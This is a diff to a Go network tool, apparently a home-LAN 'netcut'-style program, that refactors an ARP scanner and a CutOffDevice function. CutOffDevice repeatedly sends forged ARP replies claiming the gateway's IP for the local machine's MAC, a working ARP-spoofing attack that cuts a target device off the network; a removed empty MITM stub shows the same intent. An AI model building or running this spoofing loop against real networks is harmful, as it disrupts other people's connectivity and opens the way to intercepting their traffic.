@@ -11,8 +11,8 @@ import (
 )
 
 type Device struct {
-	IP  net.IP
-	MAC net.HardwareAddr
+	IP       net.IP
+	MAC      net.HardwareAddr
 	HOSTNAME []string
 }
 
@@ -23,9 +23,15 @@ type NetworkScanner struct {
 }
 
 func NewNetworkScanner(ifaceName string) *NetworkScanner {
+
 	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
 	if err != nil {
 		log.Fatalf("Error opening device %s: %v", ifaceName, err)
+	}
+
+	// Chỉ bắt ARP cho sạch
+	if err := handle.SetBPFFilter("arp"); err != nil {
+		log.Fatalf("Error setting BPF filter: %v", err)
 	}
 
 	iface, err := net.InterfaceByName(ifaceName)
@@ -38,24 +44,37 @@ func NewNetworkScanner(ifaceName string) *NetworkScanner {
 		log.Fatalf("Error getting addresses for interface %s: %v", ifaceName, err)
 	}
 
-	localIP := addrs[0].(*net.IPNet).IP.To4()
-	localMAC := iface.HardwareAddr
+	var localIP net.IP
+	for _, addr := range addrs {
+		if ipnet, ok := addr.(*net.IPNet); ok {
+			ip := ipnet.IP.To4()
+			if ip != nil {
+				localIP = ip
+				break
+			}
+		}
+	}
+
+	if localIP == nil {
+		log.Fatalf("No IPv4 found on interface %s", ifaceName)
+	}
 
 	return &NetworkScanner{
 		handle:   handle,
 		localIP:  localIP,
-		localMAC: localMAC,
+		localMAC: iface.HardwareAddr,
 	}
 }
 
 func (ns *NetworkScanner) NetScan(targetNet string) []Device {
+
 	_, ipNet, err := net.ParseCIDR(targetNet)
 	if err != nil {
 		log.Fatalf("Error parsing CIDR: %v", err)
 	}
+
 	fmt.Printf("Scanning network %s...\n", ipNet)
 
-	// Create a channel to signal when the scan is done
 	done := make(chan bool)
 	defer close(done)
 
@@ -64,14 +83,18 @@ func (ns *NetworkScanner) NetScan(targetNet string) []Device {
 			if ip.Equal(ns.localIP) {
 				continue
 			}
-			go SendARPRequest(ns.handle, net.HardwareAddr{0, 0, 0, 0, 0, 0}, ns.localMAC, ns.localIP, ip)
-			time.Sleep(250 * time.Millisecond) // Limit the rate of ARP requests
+			go SendARPRequest(
+				ns.handle,
+				net.HardwareAddr{0, 0, 0, 0, 0, 0},
+				ns.localMAC,
+				ns.localIP,
+				ip,
+			)
+			time.Sleep(200 * time.Millisecond)
 		}
-		time.Sleep(1 * time.Second) 
-		done <- true 
+		time.Sleep(1 * time.Second)
+		done <- true
 	}()
-
-	fmt.Println("Waiting for responses...")
 
 	packetSource := gopacket.NewPacketSource(ns.handle, ns.handle.LinkType())
 	var devices []Device
@@ -82,28 +105,34 @@ func (ns *NetworkScanner) NetScan(targetNet string) []Device {
 			device := HandleARPPacket(packet)
 			if device.IP != nil && device.MAC != nil {
 				devices = append(devices, device)
-				fmt.Printf("Discovered device: IP=%s, MAC=%s, HOSTNAME: %s\n", device.IP, device.MAC, device.HOSTNAME)
+				fmt.Printf("IP=%s MAC=%s\n", device.IP, device.MAC)
 			}
-		case <-done: 
-			fmt.Println("Stopping packet capture after scan completion.")
+		case <-done:
+			fmt.Println("Scan completed.")
 			return devices
 		}
 	}
 }
 
-func (ns *NetworkScanner) CutOffDevice(device Device,gateway string) {
-	for {
-		routerIp := net.ParseIP(gateway).To4()
-		SendARPReply(ns.handle, device.MAC, device.IP, ns.localMAC, routerIp)
-		time.Sleep(2 * time.Second) 
+func (ns *NetworkScanner) CutOffDevice(device Device, gateway string) {
+
+	routerIP := net.ParseIP(gateway).To4()
+	if routerIP == nil {
+		log.Fatal("Invalid gateway IP")
 	}
 
-}
-
-func MITM(device Device) {
+	for {
+		SendARPReply(
+			ns.handle,
+			device.MAC,
+			device.IP,
+			ns.localMAC,
+			routerIP,
+		)
+		time.Sleep(2 * time.Second)
+	}
 }
 
 func (ns *NetworkScanner) Close() {
 	ns.handle.Close()
 }
-
